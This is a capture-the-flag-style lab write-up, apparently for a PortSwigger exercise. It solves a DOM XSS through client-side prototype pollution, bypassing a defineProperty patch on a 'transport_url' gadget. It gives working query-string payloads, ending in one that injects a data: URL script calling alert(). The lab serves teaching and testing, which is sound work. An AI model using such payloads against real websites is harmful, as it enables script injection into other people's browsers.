
# Lab 1

## Description

This lab is vulnerable to DOM XSS via client-side prototype pollution. The website's developers have noticed a potential gadget and attempted to patch it. However, you can bypass the measures they've taken.

To solve the lab:

1. Find a source that you can use to add arbitrary properties to the global `Object.prototype`.
    
2. Identify a gadget property that allows you to execute arbitrary JavaScript.
    
3. Combine these to call `alert()`.
    

You can solve this lab manually in your browser, or use [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) to help you.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out [Widespread prototype pollution gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets) by [Gareth Heyes](https://portswigger.net/research/gareth-heyes).


## Solution

Enter:

```
/?__proto__[foo]=bar
```

as GET request. Head to console and type:

```
Object.prototype
```

which shows:

```
{foo: 'bar', __defineGetter__: ƒ, __defineSetter__: ƒ, hasOwnProperty: ƒ, __lookupGetter__: ƒ, …}
```

which shows successful prototype pollution. 

Then lookup the js source code `searchLoggerConfigurable.js`. If `transport_url` is set, a `script` tag is added to the page:


```
if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
```

How to set `transport_url` to `config`?

The `transport_url` is unwritable and unconfigurable:

```
let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
```

but it lacks a `value` property.

Using the prototype pollution found earlier we can test:

```
/?__proto__[value]=bar
```

then read through the HTML source code:

```
[...]
<script src="bar"></script>
[...]
```

tweaking the payload to:

```
/?__proto__[value]=data:,alert(1);
```

solves the lab.

